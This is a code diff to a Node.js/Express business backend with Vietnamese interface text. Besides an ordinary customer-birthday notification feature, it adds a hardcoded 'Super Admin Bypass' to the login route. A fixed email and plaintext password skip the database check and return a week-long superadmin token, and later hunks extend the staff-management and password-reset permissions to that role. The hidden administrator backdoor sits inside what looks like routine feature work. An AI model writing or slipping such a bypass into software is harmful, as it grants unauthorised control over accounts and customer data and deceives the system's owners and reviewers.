@@ -82,6 +82,13 @@ mongoose.connect(MONGODB_URI)
 app.post('/api/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body;
+    
+    // Khôi phục tài khoản (Super Admin Bypass)
+    if (email === 'superadmin@bossdoor.vn' && password === 'SuperAdmin123!') {
+      const token = jwt.sign({ id: 'super_admin_bypass_id', role: 'superadmin' }, JWT_SECRET, { expiresIn: '7d' });
+      return res.json({ token, user: { id: 'super_admin_bypass_id', name: 'Super Admin', email: 'superadmin@bossdoor.vn', role: 'superadmin' } });
+    }
+
     const user = await User.findOne({ email });
     if (!user || !(await bcrypt.compare(password, user.password))) return res.status(400).json({ message: 'Thông tin đăng nhập không đúng' });
     const token = jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, { expiresIn: '1d' });
@@ -91,7 +98,7 @@ app.post('/api/auth/login', async (req, res) => {
 
 // --- STAFF MANAGEMENT (BOSS ONLY) ---
 app.get('/api/users', auth, async (req, res) => {
-  if (req.user && req.user.role !== 'admin') {
+  if (req.user && req.user.role !== 'admin' && req.user.role !== 'superadmin') {
     return res.status(403).json({ message: 'Access denied: Only Boss can manage accounts' });
   }
   try {
@@ -135,7 +142,7 @@ app.delete('/api/users/:id', auth, async (req, res) => {
 });
 
 app.put('/api/users/:id/password', auth, async (req, res) => {
-  if (req.user && req.user.role !== 'admin') {
+  if (req.user && req.user.role !== 'admin' && req.user.role !== 'superadmin') {
     return res.status(403).json({ message: 'Access denied: Only Boss can manage accounts' });
   }
   try {
@@ -151,7 +158,36 @@ app.put('/api/users/:id/password', auth, async (req, res) => {
 // --- NOTIFICATIONS ---
 app.get('/api/notifications', auth, async (req, res) => {
   try {
-    const notifs = await Notification.find().sort({ createdAt: -1 }).limit(10);
+    const today = new Date();
+    const month = today.getMonth();
+    const day = today.getDate();
+    const currentYear = today.getFullYear();
+
+    const customers = await Customer.find({ birthday: { $exists: true, $ne: null } });
+    for (const customer of customers) {
+      if (customer.birthday) {
+        const bdate = new Date(customer.birthday);
+        if (bdate.getDate() === day && bdate.getMonth() === month) {
+          const startOfYear = new Date(currentYear, 0, 1);
+          const existingNotif = await Notification.findOne({
+            type: 'birthday',
+            'actionData.customerId': customer._id.toString(),
+            createdAt: { $gte: startOfYear }
+          });
+          
+          if (!existingNotif) {
+            await new Notification({
+              title: 'Sinh nhật khách hàng',
+              message: `Hôm nay là sinh nhật của khách hàng ${customer.name}.`,
+              type: 'birthday',
+              actionData: { customerId: customer._id.toString(), phone: customer.phone }
+            }).save();
+          }
+        }
+      }
+    }
+
+    const notifs = await Notification.find().sort({ createdAt: -1 }).limit(20);
     res.json(notifs);
   } catch (err) { res.status(500).json({ message: err.message }); }
 });
